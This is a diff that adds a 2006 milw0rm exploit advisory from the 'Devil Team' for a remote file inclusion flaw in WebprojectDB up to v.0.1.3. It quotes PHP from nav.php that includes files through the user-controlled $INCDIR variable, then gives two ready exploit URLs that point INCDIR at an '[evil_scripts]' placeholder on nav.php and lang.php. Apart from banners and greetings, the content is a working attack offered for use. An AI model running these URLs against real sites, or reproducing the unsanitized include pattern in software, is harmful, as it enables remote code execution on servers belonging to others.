@@ -1,0 +1,54 @@
+$$$$$$$$$$$$$$$ DEVIL TEAM THE BEST POLISH TEAM $$$$$$$$$$$$$$$
+$$
+$$  WebprojectDB (INCDIR) <= v.0.1.3 Remote File Include Vulnerability
+$$  script site: http://sourceforge.net/projects/webprojectdb/
+$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$
+$$              Find by: Kacper (a.k.a Rahim)
+$$
+$$ Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl
+$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$
+$$  Greetz: DragonHeart, Satan, Leito, Leon, Luzak,
+$$           Adam, DeathSpeed, Drzewko, pepi
+$$
+$$  Specjal greetz: DragonHeart ;-)
+$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+/*
+In nav.php: (2-19)
+.....
+// Site Navigation: the top strip of links and all the authentication
+issues.
+
+include "$INCDIR/auth.php";        // auth_xxx plugins
+include "$INCDIR/sitemap.php";
+
+
+// maybe do on-demand loading here some day.
+function get_page($pagename) {
+   global $SITEMAP;
+   return isset($SITEMAP[$pagename]) ? $SITEMAP[$pagename] : '';
+}
+
+
+// show the path up to $pagename
+function nav_path($pagename,$level=0) {
+   global $project_id, $projectcat_id, $thread_id, $forum_id;
+   global $msg_id, $org_id;
+   global $SESSION_VAR, $url_path;
+.....
+*/
+#Expl:
+
+
+http://www.site.com/[WebprojectDB_path]/include/nav.php?INCDIR=[evil_scripts]
+
+http://www.site.com/[WebprojectDB_path]/include/lang.php?INCDIR=[evil_scripts]
+
+
+#Pozdro dla wszystkich ;-)
+
+# milw0rm.com [2006-06-11]
